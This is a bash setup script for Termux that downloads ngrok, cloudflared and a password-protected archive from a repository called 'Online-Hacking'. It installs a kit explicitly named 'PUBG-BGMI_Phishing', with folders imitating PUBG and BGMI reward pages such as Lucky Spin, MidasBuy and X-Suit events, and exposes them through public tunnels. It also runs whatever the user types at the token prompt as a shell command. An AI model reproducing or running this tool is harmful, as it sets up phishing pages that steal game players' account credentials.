#!/bin/bash
echo ""
clear
echo ""
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!          DOWNLOAD TOOL FILE          !!\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
echo ""
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip
unzip ngrok-stable-linux-386.zip
wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
wget https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/PUBG-BGMI/SUMAN-PUBG.rar
unrar x -Password SUMAN-PUBG.rar
rm -rf SUMAN-PUBG.rar 
chmod +x ngrok
chmod +x PUBG
chmod +x BGMI
chmod +x cloudflared
clear
echo ""
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!        Requirement Ngrok Token       !!\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
echo ""
echo""
echo -e "\e[31m[\e[32m*\e[31m]\e[33m Visit \e[32mngrok.com \e[m "
echo ""
echo -e "\e[31m[\e[32m*\e[31m]\e[33m Sign up & get ngrok authtoken \e[m "
echo ""
sleep 1
echo ""
read -p $'\e[31m[\e[32m*\e[31m]\e[33m Enter The Ngrok Token [Ex. ./ngrok authtoken 1Y7IU ] : \e[0m' token
$token
sleep1
echo""
echo
cp -R cloudflared ngrok SUMAN/Collect-EVENT-LINE/
cp -R cloudflared ngrok SUMAN/Collect-MC-Larent-Car/
cp -R cloudflared ngrok SUMAN/Lucky-Spin-Godzila-S19/
cp -R cloudflared ngrok SUMAN/MidasBuy/
cp -R cloudflared ngrok SUMAN/SPIN-EVENT/
cp -R cloudflared ngrok SUMAN/X-Suit/
cp -R cloudflared ngrok SUMAN1/COLLECT-S19-ID/
cp -R cloudflared ngrok SUMAN1/Godzilla-LuckySpin/
cp -R cloudflared ngrok SUMAN1/RPS19-COLLECT/
cp -R cloudflared ngrok SUMAN1/X-Suit-LuckySpin/
chmod 7777 PUBG-BGMI_Phishing
clear
echo
clear
echo
echo
cp -R ngrok /data/data/com.termux/files/usr/bin
cp -R SUMAN /data/data/com.termux/files/usr/bin
cp -R SUMAN1 /data/data/com.termux/files/usr/bin
cp -R PUBG /data/data/com.termux/files/usr/bin
cp -R BGMI /data/data/com.termux/files/usr/bin
cp -R PUBG-BGMI_Phishing /data/data/com.termux/files/usr/bin
cp -R cloudflared /data/data/com.termux/files/usr/bin
cp -R OnlineHacking /data/data/com.termux/files/usr/bin
echo
echo
echo -e "\e[35m[+] Connect Online Hacking PUBG BGMI Hacking Server......  \e[m "
echo
sleep 1
bash 1.sh
echo
exit
